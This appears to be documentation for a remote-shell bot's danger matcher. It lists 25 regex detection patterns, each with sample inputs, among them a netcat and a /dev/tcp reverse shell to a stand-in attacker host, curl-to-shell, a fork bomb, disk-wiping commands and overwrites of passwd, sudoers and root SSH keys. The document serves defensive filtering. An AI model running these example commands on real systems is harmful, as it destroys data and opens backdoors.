# The danger matcher

Every built-in regex pattern, with an example input that trips it
and the reasoning behind it. This is the most-requested doc in the
tree — your threat-model brain lives here.

## How it works

Source: [`internal/danger/danger.go`](../../internal/danger/danger.go).

```go
type Matcher struct { patterns []*regexp.Regexp }

func New(extra []string) (*Matcher, error)    // built-ins + extras
func (m *Matcher) Match(cmd string) (string, bool)  // first match wins
```

On every command (before it reaches the shell), `Matcher.Match` is
called. If it returns `(pattern, true)`:

- For admin+ callers: inline-keyboard confirm prompt (`✅ Run` /
  `❌ Cancel`). The confirm token has a TTL (`confirm_ttl`, default
  60s). Tapping Cancel or letting it expire drops the command.
- Audit rows fire for every branch: `danger_requested`,
  `danger_confirmed`, `danger_expired`.

## Honest scope

From the top of `danger.go`:

> Honest scope: regexes can never close the hole — bash syntax
> tricks (variable indirection, base64 → sh, `$'\xNN'` composition,
> eval of reassembled strings) defeat any pattern. The real defense
> against a user-role caller running destructive things as root is
> OS-level isolation: user-role shells are non-root (see
> `user_shell_user`), so most of these commands fail at the OS
> level even when the regex is bypassed. This list is the typo-guard
> for admins plus a speedbump for the lazy attacker.

Read that twice. The danger matcher is layer 5 of 8 (see
[README.md](README.md)) — not the whole defense.

## The built-in patterns

Exact regex strings from `defaults` in `danger.go`, one section per
concern area.

### Destructive disk / device writes

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 1 | `\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f\|-[a-zA-Z]*f[a-zA-Z]*r)\b` | `rm -rf /tmp/build`, `rm -fr ~/old` | Recursive+force `rm`. Both orderings (`-rf`, `-fr`) plus mixed flags like `-vfr` all trigger. Most famous destructive-command class. |
| 2 | `\bdd\b.*\bof=/dev/` | `dd if=iso.img of=/dev/sda bs=1M` | Direct write to a raw block device via `dd`. Overwrites partition tables, filesystems, live data. Never legitimate from a remote shell. |
| 3 | `\bmkfs\.` | `mkfs.ext4 /dev/sda1`, `mkfs.xfs /dev/nvme0n1p2` | Filesystem creation. Implicit device wipe. Any `mkfs.*` variant. |
| 4 | `\b(fdisk\|parted\|wipefs)\b` | `fdisk /dev/sda`, `wipefs -a /dev/sdb`, `parted /dev/vda mklabel gpt` | Disk partitioning and label wiping tools. |
| 5 | `>\s*["']?/dev/(sd\|nvme\|mmcblk\|vd\|xvd)` | `echo foo > /dev/sda`, `cat big > '/dev/nvme0n1'` | Shell redirection to a raw block device. Quoted paths tolerated. |
| 6 | `\btee\s+(-a\s+)?["']?/dev/(sd\|nvme\|mmcblk\|vd\|xvd)` | `cat x \| tee /dev/sda`, `tee -a "/dev/vdb" < backup.img` | Piping to raw disk via `tee`. `-a` append variant included. |

### Power / init

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 7 | `\b(shutdown\|reboot\|halt\|poweroff)\b` | `shutdown -h now`, `reboot`, `halt` | Service DoS: the VPS is down until a console restart. `user`-role can't do these without sudo, but this catches admin typos. |
| 8 | `\binit\s+[06]\b` | `init 0`, `init 6` | Legacy init runlevel — 0 = halt, 6 = reboot. |

### Filesystem-wide ownership changes

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 9 | `\b(chown\|chmod)\s+-R\s+/\s*($\|[^a-zA-Z0-9_])` | `chown -R nobody /`, `chmod -R 777 /` | Recursive chmod/chown of `/`. Breaks the entire system (boot, ssh, systemd, everything). The tail assertion `$\|[^a-zA-Z0-9_]` rejects false positives like `chown -R user /home/foo` (next char would be alphanumeric). |

### Pipe-to-shell

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 10 | `\|\s*(ba\|z\|k\|c\|d\|)sh\b` | `curl https://x.com/install \| sh`, `wget -O- https://y.com/bootstrap \| bash`, `\| zsh` | The classic "run an unknown script from the internet" pattern. Matches piping into any of `sh`, `bash`, `zsh`, `ksh`, `csh`, `dash`. |

### Account / credential changes

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 11 | `\buserdel\b` | `userdel alice`, `userdel -r bob` | Delete a unix account. Often legitimate, sometimes not — a `/confirm` never hurts. |
| 12 | `\bpasswd\s+root\b` | `passwd root` | Change the root password. If you're doing this remotely, confirm you mean it. |

### Fork bomb

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 13 | `:\(\)\s*\{\s*:\|:&\s*\};:` | `:(){ :\|:& };:` | The classic shell fork bomb. Functionally `while :; do :; done \| fork`. Exhausts PIDs + kernel memory. |

### Network / firewall attack surface

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 14 | `\biptables\s+-F\b` | `iptables -F`, `iptables -F INPUT` | Flush firewall rules. Possibly legitimate during debugging; possibly catastrophic. |
| 15 | `\bsystemctl\s+(stop\|disable\|mask)\s+(ssh\|sshd)\b` | `systemctl stop sshd`, `systemctl mask ssh` | Takes SSH offline. Do this remotely without thinking → you're locked out. |

### Authentication file overwrites

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 16 | `>\s*["']?/etc/(shadow\|passwd\|sudoers\|group\|gshadow)\b` | `echo root::0:0::/root:/bin/bash > /etc/passwd`, `tee > "/etc/shadow"` | Overwriting the core auth files. Nuclear privilege-escalation vector. |
| 17 | `>\s*["']?/etc/sudoers\.d/` | `echo 'alice ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/alice` | Drop-in sudoers file. Sudoers.d has higher precedence than `/etc/sudoers` for policy. |
| 18 | `>\s*["']?/root/\.ssh/` | `echo mypubkey > /root/.ssh/authorized_keys` | Overwriting root's authorized_keys gives the attacker persistent SSH access. |

### Find-based destruction

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 19 | `\bfind\b[^\n]*\s-delete\b` | `find / -name id_rsa -delete` | `find` with `-delete` flag. Unlike `-exec rm`, `-delete` traverses and deletes in one call — no confirmation step. Almost always an attempt to silently sweep. |
| 20 | `\bfind\b[^\n]*\s-exec\s+rm\b` | `find / -type f -exec rm {} \;` | Same class, different syntax. |

### File truncation

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 21 | `\btruncate\s+-s\s*0\b` | `truncate -s 0 /etc/passwd`, `truncate -s 0 *.log` | Set file size to zero. Common for log zeroing, but also for wiping password hashes to blank. |

### Interpreter one-liners

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 22 | `\b(perl\|python[23]?\|ruby\|node\|php)\s+-[ecErR]\b` | `python -c "import shutil; shutil.rmtree('/')"`, `perl -e 'unlink "/etc/shadow"'`, `ruby -r fileutils -e 'FileUtils.rm_rf "/"'` | Scripting-language `-c` / `-e` / `-E` / `-r` / `-R` flags. These bypass the entire shell-level danger matcher. From the source: "Admins use these frequently; false positives mean admin taps /confirm often. Tradeoff accepted." |

### Immutable flag

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 23 | `\bchattr\s+[+-]i\b` | `chattr -i /etc/shadow`, `chattr +i /etc/resolv.conf` | The immutable flag, set/cleared via `chattr`, hides tampering from routine tools (even `root` can't overwrite an `+i` file without clearing first). Classic for persistent backdoors. |

### Reverse shells / network listeners

| # | Regex | Example input | Rationale |
|---|-------|---------------|-----------|
| 24 | `\b(nc\|ncat\|netcat)\s+-[elL]\b` | `nc -l 4444`, `ncat -e /bin/bash attacker.com 4444`, `netcat -L` | Netcat listener or exec-on-connect flags. Textbook reverse shells. |
| 25 | `/dev/tcp/` | `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`, `exec 5<>/dev/tcp/victim/80` | Bash's built-in TCP socket. "Essentially no legitimate use outside reverse shells" — from the source comment. Matched anywhere in the command. |

Total: **25 patterns** shipped with shellboto on master.

## Adding your own patterns

`extra_danger_patterns` in config accepts any list of Go regex
strings:

```toml
extra_danger_patterns = [
  '\bvisudo\b',                                  # any sudoers edit
  '\bnewgrp\b',                                  # group-switching
  '\bdocker\s+(rm\|exec)\b',                     # if you run containers
  '\bapt(-get)?\s+(purge\|autoremove)\b',        # paranoia over apt
  '\bcrontab\s+-r\b',                            # blow away cron
]
```

- Compiled at startup; bad regex = fatal error with the offending
  pattern echoed.
- Merged with the built-ins; first match wins regardless of origin.
- No deduplication — if you add a pattern that overlaps a built-in,
  the effective behaviour is the same.

## Testing a pattern without running it

```bash
shellboto simulate 'your command string here'
```

Reports the matched pattern (if any):

```
$ shellboto simulate 'rm -rf /tmp/build'
⚠  DANGER: matched pattern \brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b
    cmd: rm -rf /tmp/build
```

or:

```
$ shellboto simulate 'ls /tmp'
✅ no danger pattern matched
```

Use this when tuning `extra_danger_patterns`.

## The `/confirm` flow from the user's perspective

1. User sends `rm -rf /tmp/build`.
2. Bot replies:
   ```
   ⚠  This command matched danger pattern: \brm\s+...
       rm -rf /tmp/build

       Tap ✅ Run to execute, or let this prompt expire.
       [ ✅ Run ]  [ ❌ Cancel ]
   ```
3. Audit: `kind=danger_requested`, `danger_pattern=<the regex>`.
4. If the user taps ✅ Run within `confirm_ttl` (default 60s):
   - Audit: `kind=danger_confirmed`.
   - Command is dispatched normally.
5. If the user taps ❌ Cancel:
   - Audit: `kind=danger_expired` (same kind for both cancel and
     TTL expiry — UI distinction, not audit distinction).
   - Message is edited to "cancelled."
6. If the TTL elapses without a tap:
   - Audit: `kind=danger_expired`.
   - Message is edited; keyboard stripped.

## Why not block outright?

Because admins need to run `rm -rf /old/build/dir` legitimately. A
hard block would force them to prefix every dangerous command with
a bypass — which trains them to bypass reflexively, defeating the
point. The confirm dialog forces a *second* deliberate action,
which is all the layer is meant to buy.

For the cases where you really want a hard block on specific
commands: use OS-level perms (non-root user shells, sudoers rules,
AppArmor / SELinux policy). The danger matcher is not the right
layer for absolute blocks.

## What about `role=user`?

For `role=user` callers:

- Danger matches still trigger the `/confirm` flow.
- But critically, the user is running under `user_shell_user`
  (not root, if configured). `rm -rf /` fails on perms almost
  immediately. `dd of=/dev/sda` fails on perms. `userdel`,
  `passwd`, `chattr`, `iptables`, `systemctl stop sshd` — all fail
  on perms.
- So the danger matcher for users is primarily about catching
  scripting-language escape attempts + piping malicious content.

## Read next

- [threat-model.md](threat-model.md) — where this layer fits in
  the defense stack.
- [secret-redaction.md](secret-redaction.md) — the sibling regex
  table for audit-log scrubbing.
- [../reference/danger-patterns.md](../reference/danger-patterns.md)
  — one-page tabular cheat sheet of just the regexes.
